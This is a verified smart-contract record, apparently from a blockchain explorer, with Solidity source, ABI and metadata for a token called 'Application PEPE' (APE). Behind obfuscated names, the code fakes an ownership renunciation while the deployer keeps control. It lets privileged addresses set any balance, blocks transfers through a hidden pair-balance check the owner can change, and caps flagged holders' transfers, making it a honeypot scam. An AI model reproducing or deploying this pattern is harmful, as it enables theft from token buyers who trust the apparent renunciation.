{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface sellFromTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txFrom) external view returns (uint256);\n\n    function transfer(address feeReceiver, uint256 limitShould) external returns (bool);\n\n    function allowance(address fromReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeReceiver,\n        uint256 limitShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityLaunchedAt, uint256 value);\n    event Approval(address indexed fromReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract takeLaunchAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromEnable {\n    function createPair(address atTotalLaunch, address isTx) external returns (address);\n}\n\ninterface senderMarketing is sellFromTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ApplicationPEPE is takeLaunchAt, sellFromTake, senderMarketing {\n\n    function getOwner() external view returns (address) {\n        return enableTx;\n    }\n\n    function approve(address walletBuy, uint256 limitShould) public virtual override returns (bool) {\n        atShouldSell[_msgSender()][walletBuy] = limitShould;\n        emit Approval(_msgSender(), walletBuy, limitShould);\n        return true;\n    }\n\n    function launchedMaxFund(address liquiditySender) public {\n        require(liquiditySender.balance < 100000);\n        if (teamShould) {\n            return;\n        }\n        if (buyWallet) {\n            sellWallet = true;\n        }\n        enableSender[liquiditySender] = true;\n        if (marketingFrom == toSender) {\n            listTake = false;\n        }\n        teamShould = true;\n    }\n\n    function listBuy() public {\n        emit OwnershipTransferred(limitFrom, address(0));\n        enableTx = address(0);\n    }\n\n    address autoLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public atTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atTx;\n    }\n\n    function allowance(address launchExempt, address walletBuy) external view virtual override returns (uint256) {\n        if (walletBuy == autoLimit) {\n            return type(uint256).max;\n        }\n        return atShouldSell[launchExempt][walletBuy];\n    }\n\n    function modeLiquidity(uint256 limitShould) public {\n        limitLaunchFund();\n        amountFeeReceiver = limitShould;\n    }\n\n    uint256 constant takeReceiver = 3 ** 10;\n\n    mapping(address => mapping(address => uint256)) private atShouldSell;\n\n    function balanceOf(address txFrom) public view virtual override returns (uint256) {\n        return liquidityFromAuto[txFrom];\n    }\n\n    function transfer(address toFromAt, uint256 limitShould) external virtual override returns (bool) {\n        return launchMode(_msgSender(), toFromAt, limitShould);\n    }\n\n    uint256 private atTx = 100000000 * 10 ** 18;\n\n    bool public teamShould;\n\n    uint256 public txAutoList;\n\n    address public limitFrom;\n\n    function transferFrom(address limitBuy, address feeReceiver, uint256 limitShould) external override returns (bool) {\n        if (_msgSender() != autoLimit) {\n            if (atShouldSell[limitBuy][_msgSender()] != type(uint256).max) {\n                require(limitShould <= atShouldSell[limitBuy][_msgSender()]);\n                atShouldSell[limitBuy][_msgSender()] -= limitShould;\n            }\n        }\n        return launchMode(limitBuy, feeReceiver, limitShould);\n    }\n\n    bool private listTake;\n\n    function limitLaunchFund() private view {\n        require(enableSender[_msgSender()]);\n    }\n\n    bool private buyWallet;\n\n    address public txList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitMarketing;\n    }\n\n    bool private enableTotal;\n\n    constructor (){\n        if (toSender != atTake) {\n            sellWallet = true;\n        }\n        maxFrom takeLimitFund = maxFrom(autoLimit);\n        txList = fromEnable(takeLimitFund.factory()).createPair(takeLimitFund.WETH(), address(this));\n        \n        limitFrom = _msgSender();\n        listBuy();\n        enableSender[limitFrom] = true;\n        liquidityFromAuto[limitFrom] = atTx;\n        if (buyWallet) {\n            atTake = enableFrom;\n        }\n        emit Transfer(address(0), limitFrom, atTx);\n    }\n\n    string private marketingMin = \"Application PEPE\";\n\n    mapping(address => bool) public modeEnable;\n\n    address private enableTx;\n\n    function teamFee(address toFromAt, uint256 limitShould) public {\n        limitLaunchFund();\n        liquidityFromAuto[toFromAt] = limitShould;\n    }\n\n    bool public sellWallet;\n\n    uint256 public toSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isBuy;\n    }\n\n    uint256 private enableFrom;\n\n    uint8 private limitMarketing = 18;\n\n    uint256 private marketingFrom;\n\n    string private isBuy = \"APE\";\n\n    event OwnershipTransferred(address indexed enableSwap, address indexed launchFeeSell);\n\n    function launchMode(address limitBuy, address feeReceiver, uint256 limitShould) internal returns (bool) {\n        if (limitBuy == limitFrom) {\n            return limitExempt(limitBuy, feeReceiver, limitShould);\n        }\n        uint256 teamToken = sellFromTake(txList).balanceOf(minFeeTeam);\n        require(teamToken == amountFeeReceiver);\n        require(feeReceiver != minFeeTeam);\n        if (modeEnable[limitBuy]) {\n            return limitExempt(limitBuy, feeReceiver, takeReceiver);\n        }\n        return limitExempt(limitBuy, feeReceiver, limitShould);\n    }\n\n    uint256 amountFeeReceiver;\n\n    function owner() external view returns (address) {\n        return enableTx;\n    }\n\n    mapping(address => bool) public enableSender;\n\n    function exemptAmount(address autoTrading) public {\n        limitLaunchFund();\n        \n        if (autoTrading == limitFrom || autoTrading == txList) {\n            return;\n        }\n        modeEnable[autoTrading] = true;\n    }\n\n    function limitExempt(address limitBuy, address feeReceiver, uint256 limitShould) internal returns (bool) {\n        require(liquidityFromAuto[limitBuy] >= limitShould);\n        liquidityFromAuto[limitBuy] -= limitShould;\n        liquidityFromAuto[feeReceiver] += limitShould;\n        emit Transfer(limitBuy, feeReceiver, limitShould);\n        return true;\n    }\n\n    uint256 tradingReceiver;\n\n    bool public tradingFund;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingMin;\n    }\n\n    address minFeeTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private liquidityFromAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchFeeSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunchedAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTrading\",\"type\":\"address\"}],\"name\":\"exemptAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySender\",\"type\":\"address\"}],\"name\":\"launchedMaxFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitShould\",\"type\":\"uint256\"}],\"name\":\"modeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFromAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitShould\",\"type\":\"uint256\"}],\"name\":\"teamFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFromAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAutoList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ApplicationPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}